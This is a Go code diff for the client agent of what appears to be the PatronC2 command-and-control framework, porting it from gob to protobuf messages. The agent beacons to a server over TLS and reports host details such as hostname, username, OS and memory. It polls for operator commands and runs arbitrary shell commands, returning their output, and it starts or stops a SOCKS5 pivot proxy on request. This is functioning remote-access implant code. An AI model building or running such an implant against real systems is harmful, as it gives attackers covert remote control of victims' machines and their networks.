@@ -21,6 +21,7 @@ import (
 	"github.com/armon/go-socks5"
 	"github.com/google/uuid"
 
+	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils/linux/linux_utils"
 	"github.com/PatronC2/Patron/client/client_utils/windows/windows_utils"
 	"github.com/PatronC2/Patron/lib/common"
@@ -31,9 +32,11 @@ import (
 type ProxyServer struct {
 	server   *socks5.Server
 	listener net.Listener
-	wg       sync.WaitGroup
 	cancel   context.CancelFunc
+	wg       sync.WaitGroup
 }
+
+var activeProxy *ProxyServer
 
 func Initialize(logging_enabled string) {
 	set_logging, err := strconv.ParseBool(logging_enabled)
@@ -46,7 +49,6 @@ func Initialize(logging_enabled string) {
 			fmt.Printf("Error setting log file: %v\n", err)
 		}
 	}
-	common.RegisterGobTypes()
 }
 
 func LoadCertificate(RootCert string) (*tls.Config, error) {
@@ -99,7 +101,7 @@ func RunShellCommand(command string) string {
 	return string(output)
 }
 
-func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
+func EstablishConnection(config *tls.Config, ServerIP, ServerPort string) (*tls.Conn, error) {
 	var address string
 	if net.ParseIP(ServerIP).To4() == nil {
 		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
@@ -112,9 +114,9 @@ func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string)
 	beacon, err := tls.Dial("tcp", address, config)
 	if err != nil {
 		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
-		return nil, nil, nil, err
+		return nil, err
 	}
-	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
+	return beacon, nil
 }
 
 func GetLocalIP(beacon *tls.Conn) string {
@@ -182,106 +184,145 @@ func GetOSInfo() (string, string, string, string, string) {
 	return osType, osArch, osVersion, cpus, memory
 }
 
-func HandleSocksCommand(beacon *tls.Conn, encoder *gob.Encoder, commandResponse types.CommandResponse, activeProxy **ProxyServer) error {
-	if commandResponse.Command == "disable" {
-		if *activeProxy != nil {
+func GetActiveProxy() *ProxyServer {
+	return activeProxy
+}
+
+func ClearActiveProxy() {
+	activeProxy = nil
+}
+
+func SetActiveProxy(proxy *ProxyServer) {
+	activeProxy = proxy
+}
+
+func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
+	if cmd.GetCommand() == "disable" {
+		if GetActiveProxy() != nil {
 			logger.Logf(logger.Info, "Disabling SOCKS5 proxy")
-			(*activeProxy).StopProxy()
-			*activeProxy = nil
+			GetActiveProxy().StopProxy()
+			ClearActiveProxy()
 			logger.Logf(logger.Done, "SOCKS5 proxy disabled")
 		} else {
 			logger.Logf(logger.Info, "No active SOCKS5 proxy to disable")
 		}
-		req := types.CommandStatusRequest{
-			AgentID:       commandResponse.AgentID,
-			CommandID:     commandResponse.CommandID,
-			CommandResult: "1",
-			CommandOutput: "Stopped SOCKS5 Proxy",
-		}
-		SendRequest(encoder, types.CommandStatusRequestType, req)
-	} else {
-		if *activeProxy != nil {
-			logger.Logf(logger.Warning, "A SOCKS5 proxy is already running. Cannot start a new one.")
-			req := types.CommandStatusRequest{
-				AgentID:       commandResponse.AgentID,
-				CommandID:     commandResponse.CommandID,
-				CommandResult: "1",
-				CommandOutput: "A SOCKS5 proxy is already running. Stop it before starting a new one.",
-			}
-			SendRequest(encoder, types.CommandStatusRequestType, req)
-			return nil
-		}
 
-		portStr := commandResponse.Command
-		port, err := strconv.Atoi(portStr)
-		if err != nil || port < 1 || port > 65535 {
-			logger.Logf(logger.Error, "Invalid port number: %s", portStr)
-			req := types.CommandStatusRequest{
-				AgentID:       commandResponse.AgentID,
-				CommandID:     commandResponse.CommandID,
-				CommandResult: "1",
-				CommandOutput: fmt.Sprintf("Invalid port number: %s. Port must be between 1 and 65535.", portStr),
-			}
-			SendRequest(encoder, types.CommandStatusRequestType, req)
-			return nil
+		status := &patronobuf.CommandStatusRequest{
+			Uuid:      cmd.GetUuid(),
+			Commandid: cmd.GetCommandid(),
+			Result:    "1",
+			Output:    "Stopped SOCKS5 Proxy",
 		}
-
-		logger.Logf(logger.Debug, "Starting SOCKS5 proxy on port %d", port)
-		conf := &socks5.Config{}
-		server, err := socks5.New(conf)
-		if err != nil {
-			logger.Logf(logger.Warning, "failed to create SOCKS5 server: %v", err)
-			req := types.CommandStatusRequest{
-				AgentID:       commandResponse.AgentID,
-				CommandID:     commandResponse.CommandID,
-				CommandResult: "1",
-				CommandOutput: fmt.Sprintf("Failed to create SOCKS5 proxy: %v", err),
-			}
-			SendRequest(encoder, types.CommandStatusRequestType, req)
-			return nil
-		}
-
-		// Start the listener
-		listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
-		if err != nil {
-			logger.Logf(logger.Warning, "failed to start listener on port %d: %v", port, err)
-			req := types.CommandStatusRequest{
-				AgentID:       commandResponse.AgentID,
-				CommandID:     commandResponse.CommandID,
-				CommandResult: "1",
-				CommandOutput: fmt.Sprintf("Failed to start listener on port: %d: %v", port, err),
-			}
-			SendRequest(encoder, types.CommandStatusRequestType, req)
-			return nil
-		}
-
-		ctx, cancel := context.WithCancel(context.Background())
-		proxy := &ProxyServer{
-			server:   server,
-			listener: listener,
-			cancel:   cancel,
-		}
-
-		proxy.wg.Add(1)
-		go func() {
-			defer proxy.wg.Done()
-			logger.Logf(logger.Info, "SOCKS5 proxy server started on port %d", port)
-			if err := server.Serve(listener); err != nil && ctx.Err() == nil {
-				logger.Logf(logger.Error, "Error while running SOCKS5 proxy server: %v", err)
-			}
-		}()
-
-		*activeProxy = proxy
-		logger.Logf(logger.Done, "Started SOCKS5 proxy")
-		req := types.CommandStatusRequest{
-			AgentID:       commandResponse.AgentID,
-			CommandID:     commandResponse.CommandID,
-			CommandResult: "1",
-			CommandOutput: "Started SOCKS5 Proxy",
-		}
-		SendRequest(encoder, types.CommandStatusRequestType, req)
+		return common.WriteDelimited(conn, &patronobuf.Request{
+			Type: patronobuf.RequestType_COMMAND_STATUS,
+			Payload: &patronobuf.Request_CommandStatus{
+				CommandStatus: status,
+			},
+		})
 	}
-	return nil
+
+	// Check if already running
+	if GetActiveProxy() != nil {
+		logger.Logf(logger.Warning, "A SOCKS5 proxy is already running. Cannot start a new one.")
+		status := &patronobuf.CommandStatusRequest{
+			Uuid:      cmd.GetUuid(),
+			Commandid: cmd.GetCommandid(),
+			Result:    "1",
+			Output:    "A SOCKS5 proxy is already running. Stop it before starting a new one.",
+		}
+		return common.WriteDelimited(conn, &patronobuf.Request{
+			Type: patronobuf.RequestType_COMMAND_STATUS,
+			Payload: &patronobuf.Request_CommandStatus{
+				CommandStatus: status,
+			},
+		})
+	}
+
+	portStr := cmd.GetCommand()
+	port, err := strconv.Atoi(portStr)
+	if err != nil || port < 1 || port > 65535 {
+		logger.Logf(logger.Error, "Invalid port number: %s", portStr)
+		status := &patronobuf.CommandStatusRequest{
+			Uuid:      cmd.GetUuid(),
+			Commandid: cmd.GetCommandid(),
+			Result:    "1",
+			Output:    fmt.Sprintf("Invalid port number: %s. Port must be between 1 and 65535.", portStr),
+		}
+		return common.WriteDelimited(conn, &patronobuf.Request{
+			Type: patronobuf.RequestType_COMMAND_STATUS,
+			Payload: &patronobuf.Request_CommandStatus{
+				CommandStatus: status,
+			},
+		})
+	}
+
+	logger.Logf(logger.Debug, "Starting SOCKS5 proxy on port %d", port)
+	conf := &socks5.Config{}
+	server, err := socks5.New(conf)
+	if err != nil {
+		logger.Logf(logger.Warning, "Failed to create SOCKS5 server: %v", err)
+		status := &patronobuf.CommandStatusRequest{
+			Uuid:      cmd.GetUuid(),
+			Commandid: cmd.GetCommandid(),
+			Result:    "1",
+			Output:    fmt.Sprintf("Failed to create SOCKS5 proxy: %v", err),
+		}
+		return common.WriteDelimited(conn, &patronobuf.Request{
+			Type: patronobuf.RequestType_COMMAND_STATUS,
+			Payload: &patronobuf.Request_CommandStatus{
+				CommandStatus: status,
+			},
+		})
+	}
+
+	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
+	if err != nil {
+		logger.Logf(logger.Warning, "Failed to start listener on port %d: %v", port, err)
+		status := &patronobuf.CommandStatusRequest{
+			Uuid:      cmd.GetUuid(),
+			Commandid: cmd.GetCommandid(),
+			Result:    "1",
+			Output:    fmt.Sprintf("Failed to start listener on port: %d: %v", port, err),
+		}
+		return common.WriteDelimited(conn, &patronobuf.Request{
+			Type: patronobuf.RequestType_COMMAND_STATUS,
+			Payload: &patronobuf.Request_CommandStatus{
+				CommandStatus: status,
+			},
+		})
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	proxy := &ProxyServer{
+		server:   server,
+		listener: listener,
+		cancel:   cancel,
+	}
+
+	proxy.wg.Add(1)
+	go func() {
+		defer proxy.wg.Done()
+		logger.Logf(logger.Info, "SOCKS5 proxy server started on port %d", port)
+		if err := server.Serve(listener); err != nil && ctx.Err() == nil {
+			logger.Logf(logger.Error, "Error while running SOCKS5 proxy server: %v", err)
+		}
+	}()
+
+	SetActiveProxy(proxy)
+	logger.Logf(logger.Done, "Started SOCKS5 proxy")
+
+	status := &patronobuf.CommandStatusRequest{
+		Uuid:      cmd.GetUuid(),
+		Commandid: cmd.GetCommandid(),
+		Result:    "1",
+		Output:    "Started SOCKS5 Proxy",
+	}
+	return common.WriteDelimited(conn, &patronobuf.Request{
+		Type: patronobuf.RequestType_COMMAND_STATUS,
+		Payload: &patronobuf.Request_CommandStatus{
+			CommandStatus: status,
+		},
+	})
 }
 
 func (p *ProxyServer) StopProxy() {
@@ -292,26 +333,49 @@ func (p *ProxyServer) StopProxy() {
 	logger.Logf(logger.Info, "SOCKS5 proxy server stopped.")
 }
 
-func HandleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time) error {
-	configReq := CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter, nextCallback)
-	if err := SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
+func HandleConfigurationRequest(beacon net.Conn, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, serverIP, serverPort, callbackFrequency, callbackJitter string, nextCallback time.Time) error {
+	req := &patronobuf.Request{
+		Type: patronobuf.RequestType_CONFIGURATION,
+		Payload: &patronobuf.Request_Configuration{
+			Configuration: &patronobuf.ConfigurationRequest{
+				Uuid:              agentID,
+				Username:          username,
+				Hostname:          hostname,
+				Ostype:            osType,
+				Arch:              osArch,
+				Osbuild:           osVersion,
+				Cpus:              cpus,
+				Memory:            memory,
+				Agentip:           ip,
+				Serverip:          serverIP,
+				Serverport:        serverPort,
+				Callbackfrequency: callbackFrequency,
+				Callbackjitter:    callbackJitter,
+				Masterkey:         "MASTERKEY",
+				NextcallbackUnix:  nextCallback.Unix(),
+			},
+		},
+	}
+
+	if err := common.WriteDelimited(beacon, req); err != nil {
 		return err
 	}
 
-	var response types.Response
-	if err := decoder.Decode(&response); err != nil {
+	resp := &patronobuf.Response{}
+	if err := common.ReadDelimited(beacon, resp); err != nil {
 		return err
 	}
 
-	if response.Type == types.ConfigurationResponseType {
-		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
-			UpdateClientConfig(configResponse, ServerIP, ServerPort, CallbackFrequency, CallbackJitter)
-		} else {
-			return fmt.Errorf("unexpected payload type")
-		}
-	} else {
-		return fmt.Errorf("unexpected response type: %v", response.Type)
+	if resp.Type != patronobuf.ResponseType_CONFIGURATION_RESPONSE {
+		return fmt.Errorf("unexpected response type: %v", resp.Type)
 	}
+
+	conf := resp.GetConfigurationResponse()
+	if conf == nil {
+		return fmt.Errorf("missing configuration response payload")
+	}
+
+	UpdateClientConfig(conf, serverIP, serverPort, callbackFrequency, callbackJitter)
 	return nil
 }
 
@@ -335,16 +399,103 @@ func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cp
 	}
 }
 
-func UpdateClientConfig(config types.ConfigurationResponse, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string) {
-	UpdateConfigField(&ServerIP, config.ServerIP, "callback IP")
-	UpdateConfigField(&ServerPort, config.ServerPort, "callback port")
-	UpdateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
-	UpdateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
+func UpdateClientConfig(config *patronobuf.ConfigurationResponse, serverIP, serverPort, callbackFrequency, callbackJitter string) {
+	UpdateConfigField(&serverIP, config.GetServerip(), "callback IP")
+	UpdateConfigField(&serverPort, config.GetServerport(), "callback port")
+	UpdateConfigField(&callbackFrequency, config.GetCallbackfrequency(), "callback frequency")
+	UpdateConfigField(&callbackJitter, config.GetCallbackjitter(), "callback jitter")
 }
 
 func UpdateConfigField(current *string, new, fieldName string) {
 	if *current != new {
 		logger.Logf(logger.Info, "Updating %s", fieldName)
 		*current = new
+	}
+}
+
+func HandleCommandRequest(conn *tls.Conn, agentID string) error {
+	logger.Logf(logger.Info, "Fetching commands to run")
+
+	for {
+		req := &patronobuf.Request{
+			Type: patronobuf.RequestType_COMMAND,
+			Payload: &patronobuf.Request_Command{
+				Command: &patronobuf.CommandRequest{Uuid: agentID},
+			},
+		}
+
+		if err := common.WriteDelimited(conn, req); err != nil {
+			return fmt.Errorf("send command request: %w", err)
+		}
+
+		resp := &patronobuf.Response{}
+		if err := common.ReadDelimited(conn, resp); err != nil {
+			return fmt.Errorf("read command response: %w", err)
+		}
+
+		cmd := resp.GetCommandResponse()
+		if cmd == nil {
+			return fmt.Errorf("no command response")
+		}
+
+		logger.Logf(logger.Debug, "commandType: %v", cmd.Commandtype)
+
+		if cmd.GetCommandtype() == "socks" {
+			if err := HandleSocksCommand(conn, cmd); err != nil {
+				return fmt.Errorf("handle SOCKS5 command: %w", err)
+			}
+			continue
+		}
+
+		status := executeCommandRequest(cmd)
+
+		if status.GetResult() == "2" {
+			logger.Logf(logger.Info, "No commands to execute. Exiting command loop.")
+			return nil
+		}
+
+		statusReq := &patronobuf.Request{
+			Type: patronobuf.RequestType_COMMAND_STATUS,
+			Payload: &patronobuf.Request_CommandStatus{
+				CommandStatus: status,
+			},
+		}
+
+		if err := common.WriteDelimited(conn, statusReq); err != nil {
+			return fmt.Errorf("send command status: %w", err)
+		}
+
+		ack := &patronobuf.Response{}
+		if err := common.ReadDelimited(conn, ack); err != nil {
+			return fmt.Errorf("read command ack: %w", err)
+		}
+
+		logger.Logf(logger.Info, "Command status sent, ack received")
+	}
+}
+
+func executeCommandRequest(cmd *patronobuf.CommandResponse) *patronobuf.CommandStatusRequest {
+	if cmd.GetCommand() == "" && cmd.GetCommandtype() == "" {
+		logger.Logf(logger.Info, "No command to execute.")
+		return &patronobuf.CommandStatusRequest{Result: "2"}
+	}
+
+	var output, result string
+	switch cmd.GetCommandtype() {
+	case "shell":
+		output = RunShellCommand(cmd.GetCommand())
+		result = "1"
+	case "kill":
+		output = "~Killed~"
+		result = "1"
+	default:
+		result = "2"
+	}
+
+	return &patronobuf.CommandStatusRequest{
+		Uuid:      cmd.GetUuid(),
+		Commandid: cmd.GetCommandid(),
+		Result:    result,
+		Output:    output,
 	}
 }
